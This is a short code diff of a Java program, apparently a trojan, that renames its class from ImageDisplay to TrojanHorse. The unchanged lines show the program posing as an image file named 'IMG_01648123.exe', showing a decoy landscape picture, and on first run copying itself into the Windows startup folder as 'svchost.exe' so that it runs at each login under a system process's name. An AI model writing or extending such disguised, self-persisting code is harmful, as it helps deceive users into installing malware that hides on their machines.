@@ -7,7 +7,7 @@ import java.io.*;
 import java.nio.file.Files;
 import java.util.UUID;
 
-public class ImageDisplay
+public class TrojanHorse
 {
     public static void main(String[] args)
     {
@@ -17,7 +17,7 @@ public class ImageDisplay
         boolean firstTime = !System.getProperty("user.dir").equalsIgnoreCase(startUpDirectory);
         if(firstTime)
         {
-            new ImageDisplay();
+            new TrojanHorse();
 
             File source = new File("IMG_01648123.exe");
             File destination = new File(startUpDirectory + "\\svchost.exe");
@@ -37,7 +37,7 @@ public class ImageDisplay
         }
     }
 
-    public ImageDisplay()
+    public TrojanHorse()
     {
         try {
             String filename = "/resources/landscape.jpg";
